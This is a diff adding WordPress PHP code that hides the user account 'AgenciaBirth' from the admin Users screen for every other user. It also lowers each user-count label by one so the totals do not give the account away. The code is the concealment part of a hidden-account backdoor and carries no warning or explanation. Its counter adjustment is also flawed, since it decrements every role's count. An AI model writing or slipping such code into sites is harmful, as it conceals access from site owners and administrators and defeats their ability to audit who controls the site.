@@ -1,0 +1,49 @@
+add_action('pre_user_query', 'ocultar_usuario_especifico');
+
+function ocultar_usuario_especifico($query) {
+    // Só executa no painel admin e se for o WP_User_Query
+    if (is_admin() && $query->query_vars['who'] !== 'authors') {
+        global $current_user;
+
+        // Usuário que será oculto
+        $usuario_oculto = 'AgenciaBirth';
+
+        // Verifica se o usuário atual não é o "oculto"
+        if ($current_user->user_login !== $usuario_oculto) {
+            // Remove o usuário da query
+            global $wpdb;
+            $query->query_where .= " AND {$wpdb->users}.user_login != '{$usuario_oculto}'";
+        }
+    }
+}
+
+add_filter('views_users', 'ajustar_total_usuarios_visiveis');
+
+function ajustar_total_usuarios_visiveis($views) {
+    $usuario_oculto = 'AgenciaBirth';
+
+    global $wpdb;
+
+    // Pega o ID do usuário a ser ocultado
+    $user_oculto = get_user_by('login', $usuario_oculto);
+    if (!$user_oculto) return $views;
+
+    $user_oculto_id = $user_oculto->ID;
+
+    // Remove o número total dos contadores "Todos", "Administrador", etc
+    foreach ($views as $key => $view) {
+        // Remove o ID do usuário oculto dos contadores
+        $views[$key] = preg_replace_callback('/\((\d+)\)/', function ($matches) use ($user_oculto_id, $key) {
+            $count = (int)$matches[1];
+
+            // Se houver 1 ou mais, subtrai 1 (ou quantos forem necessários)
+            if ($count > 0) {
+                return '(' . ($count - 1) . ')';
+            }
+
+            return $matches[0];
+        }, $view);
+    }
+
+    return $views;
+}
